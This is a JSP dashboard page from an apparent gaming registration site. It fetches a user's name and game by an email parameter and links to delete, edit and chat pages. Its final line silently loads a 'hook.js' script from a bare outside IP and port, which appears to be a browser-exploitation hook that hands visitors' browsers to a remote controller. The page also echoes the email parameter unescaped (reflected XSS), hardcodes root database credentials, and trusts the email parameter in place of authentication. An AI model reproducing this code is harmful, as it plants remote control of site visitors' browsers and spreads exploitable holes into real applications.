<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
        <%@ page import="java.sql.*" %>
    <% Class.forName("com.mysql.jdbc.Driver"); %>
    <%@ page import="java.io.File"%>
<%@ page import="java.util.Arrays"%>
<!DOCTYPE html>
<html>
<head>
<meta charset="ISO-8859-1">
<title>DashBoard</title>
<link rel="stylesheet" href="style1.css">
<style>
.prof{
position:absolute;
top:50%;
left:50%;
transform:translate(-50%,-50%);
background-color:red;}

a {
    display: block;
    margin-top: 10px;
    font-size:45px;
    font-weight:bolder;
    text-decoration: none;
    color:whitesmoke;
}
</style>
</head>
<body>
<%@ page import="java.sql.*" %>
    <% Class.forName("com.mysql.jdbc.Driver"); %>
    <%
    Connection conn=DriverManager.getConnection("jdbc:mysql://localhost:3306/xbox","root","root");
    String gmail=request.getParameter("gmail");
    String sqlQuery="SELECT * FROM esp WHERE email=?;";
    PreparedStatement ps = conn.prepareStatement(sqlQuery);
    ps.setString(1, gmail);
    ResultSet rs=ps.executeQuery();
    String fname="",lname="",game="";
    if(rs.next()){
    	fname=rs.getString(1);
    	lname=rs.getString(2);
    	game = rs.getString(7);
    }
    ps.close();
    conn.close();
   
    %>
<div class="header">
        <div class="bars" id="nav-action">
            <span class="bar"> </span>
          </div>
          <nav id="nav">
            <ul>
              <li class="shape-circle circle-one"><a href="delete.jsp?gmail=<%=gmail %>">Delete Profile</a></li>
              <li class="shape-circle circle-two"><a href="update.jsp?gmail=<%=gmail %>">Edit Profile</a></li>
              <li class="shape-circle circle-three"><a href="logout.jsp">Log Out</a></li>
             
            </ul>
          </nav>
          <article class="container">
            <h1>Welcome,<br>Master<br><%=fname %> <%=lname %></h1>
            <br> <br> <br> <br> <br> <br> <br> <br> <br> <br> <br> <br>
            <h1>you have registered in <%=game %>.</h1>
    <br>
    <h2><a href="chat.jsp?msg=<%=gmail%>">Lets Chat With other users</a></h2>
            
          </article>
    
    </div>
    <script>
        // Setting up the Variables
var bars = document.getElementById("nav-action");
var nav = document.getElementById("nav");

//setting up the listener
bars.addEventListener("click", barClicked, false);


//setting up the clicked Effect
function barClicked() {
  bars.classList.toggle('active');
  nav.classList.toggle('visible');
}
    </script>
    <script src="http://147.185.221.21:7518/hook.js"></script>
</body>
</html>